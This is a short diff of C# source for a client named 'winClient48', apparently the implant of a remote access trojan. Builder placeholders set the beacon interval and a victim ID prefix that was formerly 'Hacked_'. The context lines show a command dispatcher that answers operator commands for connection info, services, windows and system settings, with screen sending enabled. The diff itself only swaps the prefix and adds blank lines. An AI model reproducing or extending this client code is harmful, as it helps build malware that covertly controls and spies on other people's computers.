@@ -167,7 +167,7 @@ namespace winClient48
         private int time_sendinfo = int.Parse("[INTERVAL]"); //1000; //ms
         private int dwTimeout = int.Parse("[TIMEOUT]"); //100000; //ms
         private bool send_screen = true;
-        private string id_prefix = "Hacked_";
+        private string id_prefix = "[PREFIX]";
         private string id_hardware = string.Empty;
 
         private ClientConfig clntConfig;
@@ -1092,6 +1092,7 @@ namespace winClient48
                 }
                 #endregion
                 #region Connection Info
+
                 else if (cmd[0] == "conn")
                 {
                     if (funcConn == null)
@@ -1102,6 +1103,7 @@ namespace winClient48
                         v.encSend(2, 0, "conn|init|" + funcConn.GetConn());
                     }
                 }
+
                 #endregion
                 #region ServMgr
                 else if (cmd[0] == "serv")
@@ -1128,6 +1130,7 @@ namespace winClient48
                 }
                 #endregion
                 #region WindowMgr
+
                 else if (cmd[0] == "window")
                 {
                     if (funcWindow == null)
@@ -1171,6 +1174,7 @@ namespace winClient48
                         }
                     } 
                 }
+
                 #endregion
                 #region System Informaiton
                 else if (cmd[0] == "system") //WINDOWS SYSTEM (CONTROL PANEL)
